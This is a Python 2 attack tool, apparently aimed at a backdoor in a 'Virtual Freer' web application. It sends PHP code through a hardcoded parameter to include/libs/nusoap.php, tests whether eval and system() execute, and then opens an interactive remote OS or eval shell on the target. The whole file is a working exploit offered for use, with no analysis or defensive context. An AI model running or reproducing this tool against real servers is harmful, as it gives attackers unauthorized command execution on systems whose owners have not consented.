import requests
import os
import sys

def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])

def Banner():
        print '''

     \033[1;32m[\033[1;31m+\033[1;32m]  \033[1;33mVirtual Freer \033[1;36m- \033[0;35mRemote Command Execution  \033[1;32m[\033[1;31m+\033[1;32m]

                          \033[1;32mMR.C1M1N
                 https://github.com/MrCimin
                   skyla_term@yopmail.com
'''
def inputs():
    target = raw_input('\033[1;36m[*] URL : ')
    while True:
	try:
            r = requests.get(target,verify=False)
            start(target)
        except requests.exceptions.MissingSchema:
	    target = "http://" + target

def start(target):
    print "======================\n\n[!] Checking: ****()"
    url = '%s/include/libs/nusoap.php' % (target)
    body = {'a74ad8dfacd4f985eb3977517615ce25':'echo vulnerable;'}
    r = requests.post(url,data=body,allow_redirects=False,timeout=50)
    content = r.text.encode('utf-8')
    if 'vulnerable' in content:
        print "[+] vulnerable: ****()\n"
    else:
        print "[-] Target not Vulnerable!"
	sys.exit(1)
    print "\n[!] Checking: System()"
    body = {'a74ad8dfacd4f985eb3977517615ce25':'system(id);'}
    r = requests.post(url,data=body,allow_redirects=False,timeout=50)
    content = r.text.decode('utf-8')
    if 'gid' in content:
        print "[+] vulnerable: system()\n"
	osshell(url)
    else:
        print "[-] Target not Vulnerable to Running OS Commands!"
	evalshell(url)

def osshell(url):
    print "======================\n[+] You can run os commands :D\n"
    while True:
	try:
            cmd = raw_input('OS_SHELL $ ')
            command = "system('%s');" % (cmd)
            body = {'a74ad8dfacd4f985eb3977517615ce25':command}
            r = requests.post(url,data=body,allow_redirects=False,timeout=50)
            content = r.text.encode('utf-8')
            print "\n",content
        except KeyboardInterrupt:
            print "\n____________________\n[+] GoodBye :D"
            sys.exit(1)

def evalshell(url):
    print "======================\n[+] You can just run Eval Commands :D\n"
    while True:
	try:
            cmd = raw_input('\nEval()=> ')
            command = '%s;' % (cmd)
            body = {'a74ad8dfacd4f985eb3977517615ce25':command}
            r = requests.post(url,data=body,allow_redirects=False,timeout=50)
            content = r.text.encode('utf-8')
            print "\n",content
        except KeyboardInterrupt:
            print "\n____________________\n[+] ok! GoodBye :D"
            sys.exit(1)

if __name__ == '__main__':
        clear()
        Banner()
	inputs()

